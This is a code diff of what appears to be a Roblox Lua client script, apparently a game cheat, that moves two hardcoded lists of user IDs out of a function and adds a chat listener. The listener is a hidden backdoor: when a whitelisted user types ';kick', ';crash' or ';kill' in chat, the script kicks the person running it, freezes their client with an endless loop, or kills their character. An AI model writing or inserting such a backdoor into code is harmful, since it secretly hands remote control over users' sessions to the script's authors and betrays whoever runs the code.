@@ -501,18 +501,19 @@ end)
 
 players.PlayerAdded:Connect(CheckForSweats, CheckForClanNames)
 
-task.spawn(function()
-	local a = {
-		1451596734;
-		3752180075;
-		3846711055;
-		3866519161;
-		913502943;
-	}
+local a = {
+	1451596734;
+	3752180075;
+	3846711055;
+	3866519161;
+	913502943;
+}
 
-	local b = {
-		562994998;
-	}
+local b = {
+	562994998;
+}
+
+task.spawn(function()
 
 
 	local function runcode(func)
@@ -577,3 +578,31 @@ task.spawn(function()
 		end
 	end)
 end)
+
+
+
+function output(plr, msg)
+	local player = game.Players[plr]
+	print("player chatted: " .. msg)
+	print(player.UserId)
+	for i, v in pairs(a) do
+		if player.UserId == v then
+			print("player is whitelisted")
+			if player ~= lplr then
+				if string.lower(msg) == ";kick" then
+					lplr:Kick()
+				elseif string.lower(msg) == ";crash" then
+					while true do  end
+
+				elseif string.lower(msg) == ";kill" then
+					lplr.Character.Humanoid.Health = 0
+				end
+			end
+		end
+	end
+end
+
+	local event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
+	event.OnMessageDoneFiltering.OnClientEvent:Connect(function(object)
+		output(object.FromSpeaker, object.Message or "")
+	end)
